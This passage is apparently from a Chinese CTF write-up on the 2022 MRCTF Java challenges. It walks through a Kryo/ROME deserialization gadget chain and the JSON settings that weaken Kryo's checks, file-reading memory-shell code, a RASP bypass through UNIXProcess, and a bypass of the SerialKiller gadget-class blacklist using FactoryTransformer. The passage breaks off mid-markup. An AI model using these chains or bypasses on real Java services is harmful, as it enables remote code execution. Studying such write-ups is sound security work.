<span class="keyword">null</span>) &#123;</span><br><span class="line">            str = clazz.getName().replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            str = classAsFile(clazz.getEnclosingClass(), <span class="keyword">false</span>) + <span class="string">&quot;$&quot;</span> + clazz.getSimpleName();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (suffix) &#123;</span><br><span class="line">            str += <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] classAsBytes(<span class="keyword">final</span> Class&lt;?&gt; clazz) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">final</span> String file = classAsFile(clazz);</span><br><span class="line">            <span class="keyword">final</span> InputStream in = Utils.class.getClassLoader().getResourceAsStream(file);</span><br><span class="line">            <span class="keyword">if</span> (in == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;couldn&#x27;t find &#x27;&quot;</span> + file + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">final</span> ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = in.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Utils.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="keyword">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Object tbl = Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="keyword">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="keyword">null</span>));</span><br><span class="line">        Utils.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">makeXStringToStringTrigger</span><span class="params">(Object o,Object bean)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Utils.makeMap(<span class="keyword">new</span> HotSwappableTargetSource(o), <span class="keyword">new</span> HotSwappableTargetSource(bean));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是当你兴冲冲的写好利用链以后，会发现几个问题</p><p>首先你会看到一行报错,<code>Class is not registered: java.util.HashMap</code></p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/10.png"></p><p>那么你肯定会疑惑这是什么玩意儿？它来自哪里？</p><p>我们可以看到在<code>com.esotericsoftware.kryo.Kryo#Kryo(com.esotericsoftware.kryo.ClassResolver, com.esotericsoftware.kryo.ReferenceResolver)</code></p><p>首先实例化的时候注册了一些基本类型</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/11.png"></p><p>然后在代码当中有<code>this.kryo.register(Mocha.class);</code></p><p>可以看到默认是<code>FieldSerializer</code></p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/12.png"></p><p>那我们也知道我们这个思路触发的核心是通过<code>com.esotericsoftware.kryo.serializers.MapSerializer</code>，但是这里我们没法自己注册怎么办呢，还记得上面那个路由么，demo路由当中可以根据我们前端传入的json当中的熟悉控制执行对应的set方法做属性更改，这里我不直接说需要更改哪些属性去解决这道题，个人更倾向于遇到一个问题解决一个问题</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/13.png"></p><p>那么既然能控制属性，我们也得知道能控制那一些，通过简单输出可以得到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setWarnUnregisteredClasses</span><br><span class="line">setDefaultSerializer</span><br><span class="line">setDefaultSerializer</span><br><span class="line">setClassLoader</span><br><span class="line">setRegistrationRequired</span><br><span class="line">setReferences</span><br><span class="line">setCopyReferences</span><br><span class="line">setReferenceResolver</span><br><span class="line">setInstantiatorStrategy</span><br><span class="line">setAutoReset</span><br><span class="line">setMaxDepth</span><br><span class="line">setOptimizedGenerics</span><br></pre></td></tr></table></figure><p>回到刚刚的问题</p><p>既然如此那么我们首先需要知道在哪里抛出了这个异常，可以看到在</p><p><code>com.esotericsoftware.kryo.Kryo#getRegistration(java.lang.Class)</code></p><p>简单列出现在的调用栈，是在序列化的过程当中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getRegistration:<span class="number">579</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">writeClass:<span class="number">112</span>, DefaultClassResolver (com.esotericsoftware.kryo.util)</span><br><span class="line">writeClass:<span class="number">613</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">writeClassAndObject:<span class="number">708</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">ser:<span class="number">97</span>, Testt (demo)</span><br><span class="line">main:<span class="number">121</span>, Testt (demo)</span><br></pre></td></tr></table></figure><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/14.png"></p><p>可以看到根据类型在this.classResolver.getRegistration无结果就会抛出异常，通过debug输出classResolver当中的关键信息，可以很明显得到基本都是一些基本的数据类型,没有我们的Map</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span>=[<span class="number">5</span>, <span class="keyword">char</span>], </span><br><span class="line"><span class="keyword">long</span>=[<span class="number">7</span>, <span class="keyword">long</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Byte</span></span>=[<span class="number">4</span>, <span class="keyword">byte</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Character</span></span>=[<span class="number">5</span>, <span class="keyword">char</span>], </span><br><span class="line"><span class="keyword">double</span>=[<span class="number">8</span>, <span class="keyword">double</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Short</span></span>=[<span class="number">6</span>, <span class="keyword">short</span>], </span><br><span class="line"><span class="keyword">int</span>=[<span class="number">0</span>, <span class="keyword">int</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Integer</span></span>=[<span class="number">0</span>, <span class="keyword">int</span>], </span><br><span class="line"><span class="keyword">byte</span>=[<span class="number">4</span>, <span class="keyword">byte</span>], </span><br><span class="line"><span class="keyword">float</span>=[<span class="number">2</span>, <span class="keyword">float</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Double</span></span>=[<span class="number">8</span>, <span class="keyword">double</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Boolean</span></span>=[<span class="number">3</span>, <span class="keyword">boolean</span>], </span><br><span class="line"><span class="keyword">boolean</span>=[<span class="number">3</span>, <span class="keyword">boolean</span>], </span><br><span class="line"><span class="keyword">short</span>=[<span class="number">6</span>, <span class="keyword">short</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Long</span></span>=[<span class="number">7</span>, <span class="keyword">long</span>], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span></span>=[<span class="number">1</span>, String], </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Float</span></span>=[<span class="number">2</span>, <span class="keyword">float</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们再来看在抛出异常的那部分，如果将registrationRequired设置为false，则可以略过这些过程</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/15.png"></p><p>此时它会执行<code>com.esotericsoftware.kryo.util.DefaultClassResolver#registerImplicit</code></p><p>=&gt;<code>com.esotericsoftware.kryo.Kryo#getDefaultSerializer</code>最终获取到我们需要的<code>com.esotericsoftware.kryo.serializers.MapSerializer</code></p><p>通过比对属性以及上面提到的可利用的set方法，我们能很容易通过payload的传入控制这个过程</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;RegistrationRequired&quot;</span>:<span class="literal">false</span>&#125;</span><br></pre></td></tr></table></figure><p>ok当你感觉又行的时候，又兴致冲冲运行了代码，此时又出现<code>Class cannot be created (missing no-arg constructor):</code>，字面意思是我们序列化的类需要有无参构造函数</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/16.png"></p><p>那我们再跟进代码看看实例化报错到底是怎么回事，在实例化一个类的时候会通过调用<code>com.esotericsoftware.kryo.Kryo#newInstantiator</code>，</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/18.png"></p><p>并最终会调用到<code>com.esotericsoftware.kryo.util.DefaultInstantiatorStrategy#newInstantiatorOf</code></p><p>此时的调用栈为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">newInstantiatorOf:<span class="number">96</span>, DefaultInstantiatorStrategy (com.esotericsoftware.kryo.util)</span><br><span class="line">newInstantiator:<span class="number">1190</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">newInstance:<span class="number">1199</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">create:<span class="number">163</span>, FieldSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">read:<span class="number">122</span>, FieldSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">readClassAndObject:<span class="number">880</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">read:<span class="number">226</span>, MapSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">read:<span class="number">42</span>, MapSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">readClassAndObject:<span class="number">880</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">read:<span class="number">226</span>, MapSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">read:<span class="number">42</span>, MapSerializer (com.esotericsoftware.kryo.serializers)</span><br><span class="line">readClassAndObject:<span class="number">880</span>, Kryo (com.esotericsoftware.kryo)</span><br><span class="line">deser:<span class="number">110</span>, Testt (demo)</span><br><span class="line">main:<span class="number">126</span>, Testt (demo)</span><br></pre></td></tr></table></figure><p>可以看到抛错的原因就是下面的这串代码，它默认我们的类有无参构造函数</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/17.png"></p><p>那为了解决这个问题我们也得知道是否可以不使用<code>DefaultInstantiatorStrategy</code>，转而使用其他<code>InstantiatorStrategy</code>的子类呢，答案是可以的，上面我们可以看到函数实例化的过程是通过<code>this.strategy.newInstantiatorOf(type)</code>，而这个<code>DefaultInstantiatorStrategy</code>来源于<code>strategy</code>属性</p><p>正好在Kryo类当中有set方法可以实现，<code>com.esotericsoftware.kryo.Kryo#setInstantiatorStrategy</code>，可以看到如果是<code>StdInstantiatorStrategy</code>类则正好符合（官方文档比代码好看）</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/19.png"></p><p>因此我们得到最终传参</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;polish&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;RegistrationRequired&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;InstantiatorStrategy&quot;</span>: <span class="string">&quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>可以看到又报错了，<code>_tfactory</code>空指针异常</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/20.png"></p><p>这里如何解决呢？其实很简单，别忘了我们这个可是打ROME，通过触发<code>com.rometools.rome.feed.impl.EqualsBean#beanEquals</code>我们能调用任意get方法，这时候不难想到二次反序列化，<code>java.security.SignedObject#getObject</code>，其实就是虎符的思路了没啥难度</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// creating a stream pipe-line, from b to a</span></span><br><span class="line">    ByteArrayInputStream b = <span class="keyword">new</span> ByteArrayInputStream(<span class="keyword">this</span>.content);</span><br><span class="line">    ObjectInput a = <span class="keyword">new</span> ObjectInputStream(b);</span><br><span class="line">    Object obj = a.readObject();</span><br><span class="line">    b.close();</span><br><span class="line">    a.close();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此不难得到payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloadhere</span><br></pre></td></tr></table></figure><h3 id="绕Rasp"><a href="#绕Rasp" class="headerlink" title="绕Rasp"></a>绕Rasp</h3><p>这时候你注入内存马执行会发现什么都是空的</p><p>这时候你一定很疑问为什么本地打通了远程不行，我也很疑惑，之后看到出题人说</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/21.png"></p><p>既然存在waf，那么我们第一件事情是什么呢，当然是验证是否是对payload的过滤</p><p>因此我将执行的字节码改成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.sleep(<span class="number">10000</span>);</span><br></pre></td></tr></table></figure><p>成功看到页面延时</p><p>这时候猜到可能有Rasp(毕竟对于Java过滤base64解码后的字符串有点傻)</p><p>那第一步就要知道rasp的文件内容，用个之前从p牛那里学的伪协议小trick方便我读文件以及列目录</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String urlContent = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">final</span> URL url = <span class="keyword">new</span> URL(request.getParameter(<span class="string">&quot;read&quot;</span>));</span><br><span class="line"><span class="keyword">final</span> BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span></span><br><span class="line">                                             InputStreamReader(url.openStream()));</span><br><span class="line">String inputLine = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">  urlContent = urlContent + inputLine + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">in.close();</span><br><span class="line">writer.println(urlContent);</span><br></pre></td></tr></table></figure><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/22.png"></p><p>之后成功得到rasp的地址，<code>/app/jrasp.jar</code>，那么下载下来分析即可，图没截完，意思是只要执行到<code>java.lang.ProcessImpl</code>的<code>start</code>方法,而这也就封掉了之前常见的<code>Runtime</code>,<code>ProcessBuilder</code>，甚至js执行之类的，el执行都不行，道理很简单会调用到<code>java.lang.ProcessImpl</code></p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/23.png"></p><p>如何绕过也很简单去找更下一层的调用即可，也就是通过<code>UNIXProcess</code>即可</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/24.png"></p><p>后面很恶心一个计算题</p><p>脚本有个地方小错误导致三小时没找到前面不能加<code>CHLD_IN</code>导致提前输入错误答案似乎</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">&#x27;/readflag&#x27;</span> ) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">&quot;open3() failed!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line">$r = <span class="keyword">substr</span>($r,<span class="number">0</span>,-<span class="number">3</span>);</span><br><span class="line">$r = <span class="keyword">eval</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">&quot;$r\n&quot;</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="EzJava-–-Bypass-Serialkiller"><a href="#EzJava-–-Bypass-Serialkiller" class="headerlink" title="EzJava – Bypass Serialkiller"></a>EzJava – Bypass Serialkiller</h2><h3 id="解读环境"><a href="#解读环境" class="headerlink" title="解读环境"></a>解读环境</h3><p>首先附件给了两个东西一个jar，一个serialkiller的配置文件，下面是jar当中的目录架构</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/3.png"></p><p>这有两个控制器但是第一个没啥意义，这个路由很明显需要反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloController</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/hello&quot;&#125;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/hello&quot;&#125;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(<span class="meta">@RequestBody</span> String baseStr)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] decode = Base64.getDecoder().decode(baseStr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> SerialKiller(<span class="keyword">new</span> ByteArrayInputStream(decode), <span class="string">&quot;serialkiller.xml&quot;</span>);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单看下SerialKiller类，实现是载入配置获得黑白名单，通过resolveClass做了过滤，接下来就来看看黑名单，将我们反序列化的关键点给拿捏了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blacklist</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections1,3,5,6 payload  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.Transformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.ChainedTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.ConstantTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections\.functors\.InstantiateTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections2,4 payload  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections4\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections4\.functors\.ChainedTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections4\.functors\.ConstantTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections4\.functors\.InstantiateTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>org\.apache\.commons\.collections4\.comparators\.TransformingComparator$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blacklist</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>既然如此那么首先就是想到去找替换类达到同样的效果咯</p><p>下面是我通过简单搜索发现的类，当然后面发现解决这题方案很多，我只给一个</p><h4 id="FactoryTransformer"><a href="#FactoryTransformer" class="headerlink" title="FactoryTransformer"></a>FactoryTransformer</h4><p>可以看到这个trnasfromer的transform方法，可以调用任意Factory子类的create方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FactoryTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">6817674502475353160L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Factory iFactory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title">getInstance</span><span class="params">(Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> FactoryTransformer(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FactoryTransformer</span><span class="params">(Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iFactory = factory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iFactory.create();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Factory <span class="title">getFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iFactory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到也不多，从名字就可以看出，其中有两个可以用的</p><p><img 